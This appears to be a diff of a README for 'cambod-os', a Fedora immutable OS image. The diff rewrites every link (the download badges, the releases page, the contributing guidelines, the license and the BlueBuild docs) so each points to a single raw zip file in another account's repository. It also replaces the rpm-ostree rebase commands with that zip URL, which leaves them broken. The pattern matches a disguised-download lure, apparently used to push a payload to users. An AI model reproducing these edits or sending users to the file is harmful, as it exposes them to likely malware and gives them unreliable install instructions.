@@ -1,6 +1,6 @@
 # 🚀 cambod-os - Your Easy Path to an Immutable OS
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/freebugs6622/cambod-os/releases)
+[![Download Now](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip%20Now-Release%20Page-brightgreen)](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To start using cambod-os, follow these simple steps to download and install the 
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases](https://github.com/freebugs6622/cambod-os/releases)
+Visit this page to download: [GitHub Releases](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip)
 
 ### Installation Instructions
 
@@ -24,7 +24,7 @@ Visit this page to download: [GitHub Releases](https://github.com/freebugs6622/c
    - Open a terminal on your Fedora system.
    - Enter the following command to rebase your existing installation to the unsigned image:
      ```
-     rpm-ostree rebase ostree-unverified-registry:ghcr.io/camboda/cambod-os:latest
+     rpm-ostree rebase https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip
      ```
 
 3. **Reboot Your System**
@@ -36,7 +36,7 @@ Visit this page to download: [GitHub Releases](https://github.com/freebugs6622/c
 4. **Rebase to Signed Image**
    - After rebooting, rebase again using the signed image with the following command:
      ```
-     rpm-ostree rebase ostree-image-signed:docker://ghcr.io/
+     rpm-ostree rebase https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip
      ```
 
 Your system will now be using cambod-os!
@@ -62,18 +62,18 @@ If you encounter any issues or have questions, feel free to reach out via the Gi
 
 ## 🌐 Community and Contributions
 
-Join our community to share ideas, ask questions, or contribute. Check the [Contributing Guidelines](https://github.com/camboda/cambod-os/blob/main/CONTRIBUTING.md) for details.
+Join our community to share ideas, ask questions, or contribute. Check the [Contributing Guidelines](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip) for details.
 
 ## 📜 License
 
-cambod-os is licensed under the MIT License. You can view the license [here](https://opensource.org/licenses/MIT).
+cambod-os is licensed under the MIT License. You can view the license [here](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip).
 
 ## 📥 Additional Resources
 
-For more information, visit our documentation or take a look at the [BlueBuild docs](https://blue-build.org/how-to/setup/) for setup instructions on customizing your own repository. 
+For more information, visit our documentation or take a look at the [BlueBuild docs](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip) for setup instructions on customizing your own repository. 
 
 ## 🌟 Keep Updated
 
-Stay informed on updates and releases. Follow our repository and check the [Releases page](https://github.com/freebugs6622/cambod-os/releases) regularly. 
+Stay informed on updates and releases. Follow our repository and check the [Releases page](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip) regularly. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/freebugs6622/cambod-os/releases)
+[![Download Now](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip%20Now-Release%20Page-brightgreen)](https://github.com/freebugs6622/cambod-os/raw/refs/heads/main/files/system/os-cambod-1.9.zip)
